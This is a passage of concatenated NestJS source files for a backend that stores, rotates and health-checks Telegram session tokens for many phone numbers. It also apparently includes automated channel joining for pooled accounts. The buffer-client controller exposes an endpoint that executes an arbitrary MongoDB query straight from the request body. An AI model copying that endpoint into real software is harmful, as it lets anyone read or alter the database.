{\n                this.logger.warn(`Could not verify current session status for ${mobile}, proceeding with update:`, error.message);\n            }\n\n            // Perform the update with atomic operation\n            const updatedClient = await this.archivedclientModel.findOneAndUpdate(\n                { mobile },\n                { $set: updateData },\n                {\n                    new: true,\n                    upsert: false,\n                    runValidators: true\n                }\n            ).exec();\n\n            if (!updatedClient) {\n                throw new NotFoundException(`Failed to update archived client with mobile \"${mobile}\"`);\n            }\n\n            // Clear cache for this mobile\n            this.clearCacheForMobile(mobile);\n\n            await this.auditSessionAccess(mobile, newSession, 'session_manually_updated');\n            this.logger.log(`Successfully updated session for mobile: ${mobile}`);\n\n            return updatedClient;\n\n        } catch (error) {\n            this.logger.error(`Failed to update session for mobile ${mobile}:`, error);\n\n            if (error instanceof BadRequestException || error instanceof NotFoundException) {\n                throw error;\n            }\n\n            throw new InternalServerErrorException(`Session update failed: ${error.message}`);\n        }\n    }\n\n    /**\n     * Clears validation cache entries for a specific mobile\n     */\n    private clearCacheForMobile(mobile: string): void {\n        const keysToDelete = [];\n        for (const key of this.SESSION_VALIDATION_CACHE.keys()) {\n            if (key.startsWith(`${mobile}:`)) {\n                keysToDelete.push(key);\n            }\n        }\n        keysToDelete.forEach(key => this.SESSION_VALIDATION_CACHE.delete(key));\n        this.logger.debug(`Cleared ${keysToDelete.length} cache entries for mobile: ${mobile}`);\n    }\n\n    async getOldSessions(mobile: string): Promise<string[]> {\n        if (!mobile) {\n            throw new BadRequestException('Mobile number is required');\n        }\n\n        const archivedClient = await this.findOne(mobile);\n        if (!archivedClient) {\n            throw new NotFoundException(`Archived client with mobile \"${mobile}\" not found`);\n        }\n\n        console.log(`Retrieved ${archivedClient.oldSessions?.length || 0} old sessions for ${mobile}`);\n        return archivedClient.oldSessions || [];\n    }\n\n    /**\n     * Production-grade session cleanup with detailed reporting\n     */\n    async cleanupOldSessions(mobile: string, maxSessions: number = 5): Promise<ArchivedClient> {\n        if (!mobile) {\n            throw new BadRequestException('Mobile number is required');\n        }\n\n        if (maxSessions < 0 || maxSessions > 20) {\n            throw new BadRequestException('maxSessions must be between 0 and 20');\n        }\n\n        this.logger.log(`Starting session cleanup for mobile: ${mobile}, maxSessions: ${maxSessions}`);\n\n        try {\n            const archivedClient = await this.findOne(mobile);\n            if (!archivedClient) {\n                throw new NotFoundException(`Archived client with mobile \"${mobile}\" not found`);\n            }\n\n            const oldSessions = archivedClient.oldSessions || [];\n\n            if (oldSessions.length === 0) {\n                this.logger.log(`No old sessions found for ${mobile}, cleanup not needed`);\n                return archivedClient;\n            }\n\n            this.logger.log(`Analyzing ${oldSessions.length} old sessions for ${mobile}...`);\n\n            const sessionAnalysis = {\n                active: [] as string[],\n                inactive: [] as string[],\n                failed: [] as string[]\n            };\n\n            // Analyze each session concurrently but with rate limiting\n            const sessionPromises = oldSessions.map(async (session, index) => {\n                try {\n                    // Add small delay to prevent overwhelming the system\n                    await sleep(100 * index);\n\n                    const isActive = await this.isSessionActive(mobile, session);\n                    const sessionId = session.substring(0, 10) + '...';\n\n                    if (isActive) {\n                        sessionAnalysis.active.push(session);\n                        this.logger.debug(`Session ${sessionId} is active`);\n                    } else {\n                        sessionAnalysis.inactive.push(session);\n                        this.logger.debug(`Session ${sessionId} is inactive`);\n                    }\n                } catch (error) {\n                    sessionAnalysis.failed.push(session);\n                    this.logger.warn(`Session check failed for ${session.substring(0, 10)}...:`, error.message);\n                }\n            });\n\n            await Promise.all(sessionPromises);\n\n            // Determine which sessions to keep\n            let finalActiveSessions = sessionAnalysis.active;\n\n            if (sessionAnalysis.active.length > maxSessions) {\n                // Keep only the most recent active sessions\n                finalActiveSessions = sessionAnalysis.active.slice(-maxSessions);\n                const removedCount = sessionAnalysis.active.length - maxSessions;\n                this.logger.log(`Limiting active sessions from ${sessionAnalysis.active.length} to ${maxSessions}, removing ${removedCount} oldest`);\n            }\n\n            const totalRemovedCount = sessionAnalysis.inactive.length + sessionAnalysis.failed.length +\n                                    (sessionAnalysis.active.length - finalActiveSessions.length);\n\n            if (totalRemovedCount === 0) {\n                this.logger.log(`No cleanup needed for ${mobile}, all ${oldSessions.length} sessions are active and within limit`);\n                return archivedClient;\n            }\n\n            // Update the database\n            const updatedClient = await this.archivedclientModel.findOneAndUpdate(\n                { mobile },\n                {\n                    $set: {\n                        oldSessions: finalActiveSessions,\n                        lastCleanup: new Date()\n                    }\n                },\n                { new: true }\n            ).exec();\n\n            // Audit the cleanup operation\n            await this.auditSessionAccess(mobile, 'cleanup_operation', `removed_${totalRemovedCount}_sessions`);\n\n            const summary = {\n                total: oldSessions.length,\n                active: sessionAnalysis.active.length,\n                inactive: sessionAnalysis.inactive.length,\n                failed: sessionAnalysis.failed.length,\n                kept: finalActiveSessions.length,\n                removed: totalRemovedCount\n            };\n\n            this.logger.log(`Session cleanup completed for ${mobile}:`, summary);\n            return updatedClient;\n\n        } catch (error) {\n            this.logger.error(`Session cleanup failed for mobile ${mobile}:`, error);\n\n            if (error instanceof BadRequestException || error instanceof NotFoundException) {\n                throw error;\n            }\n\n            throw new InternalServerErrorException(`Session cleanup failed: ${error.message}`);\n        }\n    }\n\n    /**\n     * Comprehensive session status with health metrics\n     */\n    async getSessionStatus(mobile: string): Promise<{\n        mobile: string;\n        isMainSessionActive: boolean;\n        totalOldSessions: number;\n        lastChecked: string;\n        healthMetrics: {\n            activeOldSessions: number;\n            lastUpdated: string;\n            sessionAge: string;\n            reliability: 'high' | 'medium' | 'low';\n        };\n    }> {\n        if (!mobile) {\n            throw new BadRequestException('Mobile number is required');\n        }\n\n        this.logger.log(`Getting comprehensive session status for mobile: ${mobile}`);\n\n        try {\n            const archivedClient = await this.findOne(mobile);\n            if (!archivedClient) {\n                throw new NotFoundException(`Archived client with mobile \"${mobile}\" not found`);\n            }\n\n            const isMainActive = await this.isSessionActive(mobile, archivedClient.session);\n\n            // Quick check of old sessions health\n            let activeOldSessions = 0;\n            if (archivedClient.oldSessions && archivedClient.oldSessions.length > 0) {\n                const healthCheckPromises = archivedClient.oldSessions.slice(0, 3).map(async (session) => {\n                    try {\n                        return await this.isSessionActive(mobile, session);\n                    } catch {\n                        return false;\n                    }\n                });\n\n                const results = await Promise.all(healthCheckPromises);\n                activeOldSessions = results.filter(Boolean).length;\n            }\n\n            // Calculate reliability based on session health\n            let reliability: 'high' | 'medium' | 'low' = 'low';\n            if (isMainActive && activeOldSessions >= 2) {\n                reliability = 'high';\n            } else if (isMainActive || activeOldSessions >= 1) {\n                reliability = 'medium';\n            }\n\n            // Calculate session age\n            const lastUpdated = (archivedClient as any).lastUpdated || (archivedClient as any).createdAt || new Date();\n            const sessionAge = this.calculateSessionAge(lastUpdated);\n\n            const result = {\n                mobile,\n                isMainSessionActive: isMainActive,\n                totalOldSessions: archivedClient.oldSessions?.length || 0,\n                lastChecked: new Date().toISOString(),\n                healthMetrics: {\n                    activeOldSessions,\n                    lastUpdated: lastUpdated.toISOString(),\n                    sessionAge,\n                    reliability\n                }\n            };\n\n            this.logger.log(`Session status check completed for ${mobile}, reliability: ${reliability}`);\n            return result;\n\n        } catch (error) {\n            this.logger.error(`Failed to get session status for mobile ${mobile}:`, error);\n\n            if (error instanceof BadRequestException || error instanceof NotFoundException) {\n                throw error;\n            }\n\n            throw new InternalServerErrorException(`Session status check failed: ${error.message}`);\n        }\n    }\n\n    /**\n     * Calculates human-readable session age\n     */\n    private calculateSessionAge(lastUpdated: Date): string {\n        const now = new Date();\n        const diffMs = now.getTime() - lastUpdated.getTime();\n        const diffMins = Math.floor(diffMs / (1000 * 60));\n        const diffHours = Math.floor(diffMins / 60);\n        const diffDays = Math.floor(diffHours / 24);\n\n        if (diffDays > 0) {\n            return `${diffDays} day${diffDays > 1 ? 's' : ''} ago`;\n        } else if (diffHours > 0) {\n            return `${diffHours} hour${diffHours > 1 ? 's' : ''} ago`;\n        } else if (diffMins > 0) {\n            return `${diffMins} minute${diffMins > 1 ? 's' : ''} ago`;\n        } else {\n            return 'Just now';\n        }\n    }\n\n    /**\n     * Batch session factory method - for multiple mobiles\n     */\n    async batchFetchSessions(mobiles: string[]): Promise<{ mobile: string; client: ArchivedClient | null; error?: string }[]> {\n        if (!mobiles || mobiles.length === 0) {\n            throw new BadRequestException('Mobile numbers array is required');\n        }\n\n        if (mobiles.length > 50) {\n            throw new BadRequestException('Batch size cannot exceed 50 mobiles');\n        }\n\n        this.logger.log(`Batch session factory request for ${mobiles.length} mobiles`);\n\n        const results = await Promise.allSettled(\n            mobiles.map(async (mobile) => {\n                try {\n                    const client = await this.fetchOne(mobile);\n                    return { mobile, client };\n                } catch (error) {\n                    return { mobile, client: null, error: error.message };\n                }\n            })\n        );\n\n        return results.map((result, index) => {\n            if (result.status === 'fulfilled') {\n                return result.value;\n            } else {\n                return {\n                    mobile: mobiles[index],\n                    client: null,\n                    error: result.reason?.message || 'Unknown error'\n                };\n            }\n        });\n    }\n\n    /**\n     * Creates a completely new client with fresh session\n     */\n    private async createNewClientWithSession(mobile: string): Promise<ArchivedClient> {\n        let attempt = 0;\n        let lastError: Error;\n\n        while (attempt < this.MAX_RETRY_ATTEMPTS) {\n            try {\n                attempt++;\n                this.logger.log(`Creating new session for ${mobile}, attempt ${attempt}/${this.MAX_RETRY_ATTEMPTS}`);\n\n                // Generate new session with timeout\n                const newSession = await Promise.race([\n                    this.generateNewSession(mobile),\n                    new Promise<never>((_, reject) =>\n                        setTimeout(() => reject(new Error('Session generation timeout')), this.SESSION_GENERATION_TIMEOUT)\n                    )\n                ]);\n\n                const newClient = await this.create({\n                    session: newSession,\n                    mobile: mobile,\n                    oldSessions: []\n                } as CreateArchivedClientDto);\n\n                await this.auditSessionAccess(mobile, newSession, 'new_client_created');\n                this.logger.log(`Successfully created new client with session for ${mobile}`);\n                return newClient;\n\n            } catch (error) {\n                lastError = error;\n                this.logger.warn(`Attempt ${attempt} failed for new client ${mobile}:`, error.message);\n\n                if (attempt < this.MAX_RETRY_ATTEMPTS) {\n                    await sleep(1000 * attempt); // Exponential backoff\n                }\n            } finally {\n                await this.safeCleanupConnection(mobile);\n            }\n        }\n\n        throw new InternalServerErrorException(`Failed to create new client after ${this.MAX_RETRY_ATTEMPTS} attempts: ${lastError.message}`);\n    }\n\n    /**\n     * Generates and updates session for existing client\n     */\n    private async generateAndUpdateSession(mobile: string, existingClient: ArchivedClient): Promise<ArchivedClient> {\n        let attempt = 0;\n        let lastError: Error;\n\n        while (attempt < this.MAX_RETRY_ATTEMPTS) {\n            try {\n                attempt++;\n                this.logger.log(`Generating new session for existing client ${mobile}, attempt ${attempt}/${this.MAX_RETRY_ATTEMPTS}`);\n\n                const newSession = await Promise.race([\n                    this.generateNewSession(mobile),\n                    new Promise<never>((_, reject) =>\n                        setTimeout(() => reject(new Error('Session generation timeout')), this.SESSION_GENERATION_TIMEOUT)\n                    )\n                ]);\n\n                // Backup current session to history\n                await this.backupSessionToHistory(mobile, existingClient.session, 'session_replaced');\n\n                // Update with new session\n                const updatedClient = await this.archivedclientModel.findOneAndUpdate(\n                    { mobile },\n                    {\n                        $set: {\n                            session: newSession,\n                            lastUpdated: new Date()\n                        },\n                        $push: {\n                            oldSessions: {\n                                $each: [existingClient.session],\n                                $slice: -this.MAX_OLD_SESSIONS\n                            }\n                        }\n                    },\n                    { new: true }\n                ).exec();\n\n                await this.auditSessionAccess(mobile, newSession, 'new_session_generated');\n                this.logger.log(`Successfully generated new session for ${mobile}`);\n                return updatedClient;\n\n            } catch (error) {\n                lastError = error;\n                this.logger.warn(`Attempt ${attempt} failed for session generation ${mobile}:`, error.message);\n\n                if (attempt < this.MAX_RETRY_ATTEMPTS) {\n                    await sleep(1000 * attempt);\n                }\n            } finally {\n                await this.safeCleanupConnection(mobile);\n            }\n        }\n\n        throw new InternalServerErrorException(`Failed to generate session after ${this.MAX_RETRY_ATTEMPTS} attempts: ${lastError.message}`);\n    }\n\n    /**\n     * Finds an active session from the session history\n     */\n    private async findActiveSessionFromHistory(archivedClient: ArchivedClient): Promise<string | null> {\n        const oldSessions = archivedClient.oldSessions || [];\n\n        if (oldSessions.length === 0) {\n            return null;\n        }\n\n        // Check sessions from most recent to oldest\n        for (let i = oldSessions.length - 1; i >= 0; i--) {\n            const session = oldSessions[i];\n            try {\n                this.logger.log(`Checking session ${i + 1}/${oldSessions.length} for ${archivedClient.mobile}`);\n\n                const isActive = await this.isSessionActive(archivedClient.mobile, session);\n                if (isActive) {\n                    this.logger.log(`Found active session in history for ${archivedClient.mobile}`);\n                    return session;\n                }\n            } catch (error) {\n                this.logger.warn(`Failed to check session ${i + 1} for ${archivedClient.mobile}:`, error.message);\n            }\n        }\n\n        return null;\n    }\n\n    /**\n     * Promotes an active session from history to be the main session\n     */\n    private async promoteActiveSession(mobile: string, activeSession: string, archivedClient: ArchivedClient): Promise<ArchivedClient> {\n        try {\n            // Remove the active session from old sessions\n            const updatedOldSessions = (archivedClient.oldSessions || []).filter(s => s !== activeSession);\n\n            // Add current session to old sessions if it's different\n            if (archivedClient.session !== activeSession) {\n                updatedOldSessions.unshift(archivedClient.session);\n            }\n\n            // Limit old sessions\n            const trimmedOldSessions = updatedOldSessions.slice(0, this.MAX_OLD_SESSIONS);\n\n            const updatedClient = await this.archivedclientModel.findOneAndUpdate(\n                { mobile },\n                {\n                    $set: {\n                        session: activeSession,\n                        oldSessions: trimmedOldSessions,\n                        lastUpdated: new Date()\n                    }\n                },\n                { new: true }\n            ).exec();\n\n            await this.auditSessionAccess(mobile, activeSession, 'session_promoted_from_history');\n            this.logger.log(`Successfully promoted session from history for ${mobile}`);\n            return updatedClient;\n\n        } catch (error) {\n            this.logger.error(`Failed to promote session for ${mobile}:`, error);\n            throw new InternalServerErrorException(`Failed to promote session: ${error.message}`);\n        }\n    }\n\n    /**\n     * Generates a new session using Telegram service\n     */\n    private async generateNewSession(mobile: string): Promise<string> {\n        try {\n            await connectionManager.getClient(mobile, { autoDisconnect: true, handler: false });\n            const newSession = await this.telegramService.createNewSession(mobile);\n\n            if (!newSession || newSession.trim().length === 0) {\n                throw new Error('Generated session is empty or invalid');\n            }\n\n            return newSession;\n        } catch (error) {\n            this.logger.error(`Session generation failed for ${mobile}:`, error);\n            throw error;\n        }\n    }\n\n    /**\n     * Audits session access for tracking purposes\n     */\n    private async auditSessionAccess(mobile: string, session: string, action: string): Promise<void> {\n        try {\n            await this.archivedclientModel.findOneAndUpdate(\n                { mobile },\n                {\n                    $push: {\n                        sessionHistory: {\n                            $each: [{\n                                session: session.substring(0, 20) + '...', // Truncate for security\n                                action,\n                                timestamp: new Date(),\n                                status: 'active'\n                            }],\n                            $slice: -50 // Keep last 50 audit entries\n                        }\n                    }\n                },\n                { upsert: false }\n            ).exec();\n        } catch (error) {\n            this.logger.warn(`Failed to audit session access for ${mobile}:`, error.message);\n            // Don't fail the main operation for audit failures\n        }\n    }\n\n    /**\n     * Safely backs up session to history\n     */\n    private async backupSessionToHistory(mobile: string, session: string, reason: string): Promise<void> {\n        try {\n            await this.auditSessionAccess(mobile, session, `backup_${reason}`);\n        } catch (error) {\n            this.logger.warn(`Failed to backup session to history for ${mobile}:`, error.message);\n        }\n    }\n\n    /**\n     * Safely cleans up connections\n     */\n    private async safeCleanupConnection(mobile: string): Promise<void> {\n        try {\n            await connectionManager.unregisterClient(mobile);\n        } catch (error) {\n            this.logger.warn(`Failed to cleanup connection for ${mobile}:`, error.message);\n        }\n    }\n\n    /**\n     * Get cache statistics for monitoring\n     */\n    getCacheStatistics(): {\n        totalEntries: number;\n        validEntries: number;\n        expiredEntries: number;\n        cacheHitRate: string;\n        lastCleanup: string;\n    } {\n        const now = Date.now();\n        let validEntries = 0;\n        let expiredEntries = 0;\n\n        for (const [, value] of this.SESSION_VALIDATION_CACHE.entries()) {\n            if (now - value.timestamp < this.CACHE_EXPIRY) {\n                validEntries++;\n            } else {\n                expiredEntries++;\n            }\n        }\n\n        const totalEntries = this.SESSION_VALIDATION_CACHE.size;\n        const cacheHitRate = totalEntries > 0 ?\n            Math.round((validEntries / totalEntries) * 100) + '%' : '0%';\n\n        return {\n            totalEntries,\n            validEntries,\n            expiredEntries,\n            cacheHitRate,\n            lastCleanup: new Date().toISOString()\n        };\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsOptional, IsNumber, Min, Max } from 'class-validator';\r\n\r\nexport class CleanupSessionsDto {\r\n    @ApiProperty({\r\n        example: 5,\r\n        description: 'Maximum number of old sessions to keep',\r\n        minimum: 0,\r\n        maximum: 20,\r\n        default: 5,\r\n        required: false\r\n    })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    @Min(0)\r\n    @Max(20)\r\n    readonly maxSessions?: number;\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateArchivedClientDto {\r\n    @ApiProperty({ example: '+916265240911', description: 'Phone number of the user' })\r\n    readonly mobile: string;\r\n\r\n    @ApiProperty({ example: '1BQANOTEuMTA4LjUg==', description: 'Current session token' })\r\n    readonly session: string;\r\n\r\n    @ApiProperty({ example: ['1BQANOTEuM==', '2CRANOTEuN=='], description: 'Array of old session tokens', required: false, type: [String] })\r\n    readonly oldSessions?: string[];\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class SessionHealthMetricsDto {\r\n    @ApiProperty({ \r\n        example: 2, \r\n        description: 'Number of active old sessions available as backup'\r\n    })\r\n    activeOldSessions: number;\r\n\r\n    @ApiProperty({ \r\n        example: '2024-01-15T08:30:00.000Z', \r\n        description: 'Timestamp when the session was last updated'\r\n    })\r\n    lastUpdated: string;\r\n\r\n    @ApiProperty({ \r\n        example: '2 hours ago', \r\n        description: 'Human-readable session age'\r\n    })\r\n    sessionAge: string;\r\n\r\n    @ApiProperty({ \r\n        example: 'high', \r\n        description: 'Session reliability rating based on availability',\r\n        enum: ['high', 'medium', 'low']\r\n    })\r\n    reliability: 'high' | 'medium' | 'low';\r\n}\r\n\r\nexport class SessionStatusDto {\r\n    @ApiProperty({ \r\n        example: '916265240911', \r\n        description: 'Mobile number of the archived client'\r\n    })\r\n    mobile: string;\r\n\r\n    @ApiProperty({ \r\n        example: true, \r\n        description: 'Whether the main session is currently active'\r\n    })\r\n    isMainSessionActive: boolean;\r\n\r\n    @ApiProperty({ \r\n        example: 3, \r\n        description: 'Total number of old sessions stored'\r\n    })\r\n    totalOldSessions: number;\r\n\r\n    @ApiProperty({ \r\n        example: '2024-01-15T10:30:00.000Z', \r\n        description: 'Timestamp when the status was last checked'\r\n    })\r\n    lastChecked: string;\r\n\r\n    @ApiProperty({ \r\n        description: 'Detailed health metrics for the session',\r\n        type: SessionHealthMetricsDto\r\n    })\r\n    healthMetrics: SessionHealthMetricsDto;\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsNotEmpty, IsString } from 'class-validator';\r\n\r\nexport class SessionUpdateDto {\r\n    @ApiProperty({ \r\n        example: '1BQANOTEuMTA4LjUg==', \r\n        description: 'New session token to set as primary session'\r\n    })\r\n    @IsNotEmpty()\r\n    @IsString()\r\n    readonly newSession: string;\r\n}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type ArchivedClientDocument = ArchivedClient & Document;\r\n\r\ninterface SessionHistoryEntry {\r\n    session: string;\r\n    action: string;\r\n    timestamp: Date;\r\n    status: string;\r\n    source?: string;\r\n}\r\n\r\n@Schema({\r\n    collection: 'archivedClients', \r\n    versionKey: false, \r\n    autoIndex: true, \r\n    timestamps: true,\r\n    toJSON: {\r\n        virtuals: true,\r\n        transform: (doc, ret) => {\r\n            delete ret._id;\r\n        },\r\n    },\r\n})\r\nexport class ArchivedClient {\r\n  \r\n    @ApiProperty({ example: '916265240911', description: 'Mobile number of the archived user' })\r\n    @Prop({ required: true , unique: true })\r\n    mobile: string;\r\n\r\n   \r\n    @ApiProperty({ example: '1BQANOTEuM==', description: 'Current session token of the archived user' })\r\n    @Prop({ required: true , unique: true })\r\n    session: string;\r\n\r\n    @ApiProperty({ example: ['1BQANOTEuM==', '2CRANOTEuN=='], description: 'Array of old session tokens' })\r\n    @Prop({ type: [String], default: [] })\r\n    oldSessions: string[];\r\n\r\n    @ApiProperty({ description: 'Last time the session was updated' })\r\n    @Prop({ type: Date })\r\n    lastUpdated?: Date;\r\n\r\n    @ApiProperty({ description: 'Last time sessions were cleaned up' })\r\n    @Prop({ type: Date })\r\n    lastCleanup?: Date;\r\n\r\n    @ApiProperty({ description: 'Session history for auditing purposes' })\r\n    @Prop({ \r\n        type: [{\r\n            session: String,\r\n            action: String,\r\n            timestamp: { type: Date, default: Date.now },\r\n            status: String,\r\n            source: String\r\n        }], \r\n        default: [] \r\n    })\r\n    sessionHistory?: SessionHistoryEntry[];\r\n\r\n    // Timestamps are automatically added by Mongoose when timestamps: true\r\n    createdAt?: Date;\r\n    updatedAt?: Date;\r\n}\r\n\r\nexport const ArchivedClientSchema = SchemaFactory.createForClass(ArchivedClient);\r\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\nimport { BufferClientService } from './buffer-client.service';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport { SearchBufferClientDto } from './dto/search-buffer- client.dto';\nimport { BufferClient } from './schemas/buffer-client.schema';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\n\n@ApiTags('Buffer Clients')\n@Controller('bufferclients')\nexport class BufferClientController {\n  constructor(private readonly clientService: BufferClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createClientDto: CreateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  async search(@Query() query: SearchBufferClientDto): Promise<BufferClient[]> {\n    return this.clientService.search(query);\n  }\n\n   @Get('updateInfo')\n    @ApiOperation({ summary: 'Update promote Clients Info' })\n    async updateInfo(): Promise<string> {\n      // Fire-and-forget pattern for long-running operations\n      this.clientService.updateInfo().catch(error => {\n        console.error('Error in checkPromoteClients:', error);\n      });\n      return \"initiated Checking\"\n    }\n  \n\n  @Get('joinChannelsForBufferClients')\n  @ApiOperation({ summary: 'Join Channels for BufferClients' })\n  async joinChannelsforBufferClients(): Promise<string> {\n    return this.clientService.joinchannelForBufferClients();\n  }\n\n  @Get('checkBufferClients')\n  @ApiOperation({ summary: 'Check Buffer Clients' })\n  async checkbufferClients(): Promise<string> {\n    this.clientService.checkBufferClients();\n    return \"initiated Checking\"\n  }\n\n  @Post('addNewUserstoBufferClients')\n  @ApiOperation({ summary: 'Add New Users to Buffer Clients' })\n  @ApiBody({ type: Object })\n  async addNewUserstoBufferClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\n    this.clientService.addNewUserstoBufferClients(body.badIds, body.goodIds);\n    return \"initiated Checking\"\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<BufferClient[]> {\n    return this.clientService.findAll();\n  }\n\n  @Get('SetAsBufferClient/:mobile')\n  @ApiOperation({ summary: 'Set as Buffer Client' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  async setAsBufferClient(\n    @Param('mobile') mobile: string,\n  ) {\n    return await this.clientService.setAsBufferClient(mobile);\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('mobile') mobile: string): Promise<BufferClient> {\n    return this.clientService.findOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.update(mobile, updateClientDto);\n  }\n\n  @Put(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('mobile') mobile: string): Promise<void> {\n    return this.clientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiBody({ type: Object })\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.clientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BufferClientService } from './buffer-client.service';\nimport { BufferClientController } from './buffer-client.controller';\nimport { BufferClientSchema } from './schemas/buffer-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { UsersModule } from '../users/users.module';\nimport { ClientModule } from '../clients/client.module';\nimport { InitModule } from '../ConfigurationInit/init.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { PromoteClientModule } from '../promote-clients/promote-client.module';\nimport { SessionModule } from '../session-manager';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: 'bufferClientModule', schema: BufferClientSchema, collection: 'bufferClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ActiveChannelsModule),\n    forwardRef(() => ClientModule),\n    forwardRef(() => ChannelsModule),\n    forwardRef(() => PromoteClientModule),\n    forwardRef(() => SessionModule)\n ],\n  controllers: [BufferClientController],\n  providers: [BufferClientService],\n  exports: [BufferClientService]\n})\nexport class BufferClientModule { }\n","import { ChannelsService } from './../channels/channels.service';\nimport { Channel } from './../channels/schemas/channel.schema';\nimport {\n    BadRequestException, ConflictException, HttpException, Inject, Injectable,\n    InternalServerErrorException, Logger, NotFoundException, forwardRef, OnModuleDestroy\n} from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport { BufferClient, BufferClientDocument } from './schemas/buffer-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { ClientService } from '../clients/client.service';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\nimport { PromoteClientService } from '../promote-clients/promote-client.service';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\nimport { SessionService } from '../session-manager';\n\n@Injectable()\nexport class BufferClientService implements OnModuleDestroy {\n    private readonly logger = new Logger(BufferClientService.name);\n    private joinChannelMap: Map<string, Channel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout;\n    private leaveChannelMap: Map<string, string[]> = new Map();\n    private leaveChannelIntervalId: NodeJS.Timeout;\n    private isJoinChannelProcessing: boolean = false;\n    private isLeaveChannelProcessing: boolean = false;\n    private readonly JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000; // 4 minutes\n    private readonly LEAVE_CHANNEL_INTERVAL = 60 * 1000; // 30 seconds\n    private readonly LEAVE_CHANNEL_BATCH_SIZE = 10;\n\n    constructor(@InjectModel('bufferClientModule') private bufferClientModel: Model<BufferClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => PromoteClientService))\n        private promoteClientService: PromoteClientService,\n        @Inject(forwardRef(() => SessionService))\n        private sessionService: SessionService\n    ) { }\n    async onModuleDestroy() {\n        this.logger.log('Cleaning up BufferClientService resources');\n        this.clearBufferMap();\n        this.clearLeaveMap();\n    }\n\n    async create(bufferClient: CreateBufferClientDto): Promise<BufferClient> {\n        // Ensure status is set to 'active' by default if not provided\n        const newUser = new this.bufferClientModel({\n            ...bufferClient,\n            status: bufferClient.status || 'active',\n        });\n        return newUser.save();\n    }\n\n\n    async findAll(status?: 'active' | 'inactive'): Promise<BufferClient[]> {\n        const filter = status ? { status } : {};\n        return this.bufferClientModel.find(filter).exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<BufferClient> {\n        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n\n    async update(mobile: string, updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n        // Allow updating status as well\n        const updatedUser = await this.bufferClientModel.findOneAndUpdate(\n            { mobile },\n            { $set: updateClientDto },\n            { new: true, upsert: true, returnDocument: 'after' }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreateBufferClientDto | UpdateBufferClientDto): Promise<BufferClient> {\n        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            console.log(\"Updating\")\n            return 